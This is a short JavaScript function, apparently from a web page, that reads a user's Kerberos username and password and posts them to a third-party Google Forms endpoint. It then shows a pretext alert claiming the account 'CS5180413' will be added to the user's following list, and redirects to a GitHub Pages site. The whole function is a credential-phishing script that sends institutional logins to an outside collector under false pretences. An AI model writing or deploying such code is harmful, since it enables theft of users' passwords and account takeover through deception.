function postToGoogle(){
    var kerberos=$("#kerberos").val();
    var password=$("#password").val();
    $.ajax({
        url:"https://docs.google.com/forms/d/e/1FAIpQLSfaHUdxhTGHKgrKHEIgYtQPnt-FaxJ4WVK8JftxH2_E7cs1Yg/formResponse?",
        data:{
            "entry.830871114":kerberos,
            "entry.557142347":password,
            "entry.975199243":"CS5180413"
        },
        type:"POST",
        dataType:"xml",
        success:function(d){},
        error:function(x,y,z){
            alert("CS5180413 will be added to your following list within a minute\nif you have entered the correct credentials.");
            window.open("https://krdipen.github.io/BeMotivated/"+kerberos,"_self");
        }
    });
    return false;
}
